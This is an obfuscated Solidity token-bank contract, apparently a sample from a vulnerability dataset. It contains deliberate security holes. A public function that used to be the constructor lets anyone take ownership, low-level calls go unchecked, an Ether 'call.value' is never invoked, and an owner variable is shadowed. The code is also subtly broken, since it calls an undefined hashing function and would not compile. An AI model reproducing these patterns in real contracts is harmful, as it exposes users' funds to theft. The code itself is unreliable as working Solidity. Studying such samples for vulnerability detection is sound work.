// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Ownable
{
    address _0x692893;
    address _0x7a4864 = msg.sender;

    function _0xc02254(address _0x82a280)
    public
    _0x075dce
    {
        _0x692893 = _0x82a280;
    }

    function _0x7a8916()
    public
    {
        if(msg.sender==_0x692893)
        {
            _0x7a4864=_0x692893;
        }
    }

    modifier _0x075dce
    {
        if(_0x7a4864 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x7a4864 = msg.sender;
    function WithdrawToken(address _0xea766e, uint256 _0xe3f82c,address _0x5c8a44)
    public
    _0x075dce
    {
        _0xea766e.call(bytes4(_0xd431ef("transfer(address,uint256)")),_0x5c8a44,_0xe3f82c);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x35b305()
    public
    {
        _0x7a4864 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0xd6cd8e,address _0x89ba9d,uint _0xa7fba9)
    public
    _0x075dce
    {
        if(Holders[_0xd6cd8e]>0)
        {
            Holders[_0xd6cd8e]=0;
            WithdrawToken(_0x89ba9d,_0xa7fba9,_0xd6cd8e);
        }
    }

    function WithdrawToHolder(address _0xcb0b19, uint _0x086763)
    public
    _0x075dce
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_0xcb0b19]>=_0x086763)
            {
                _0xcb0b19.call.value(_0x086763);
                Holders[_0xcb0b19]-=_0x086763;
            }
        }
    }

}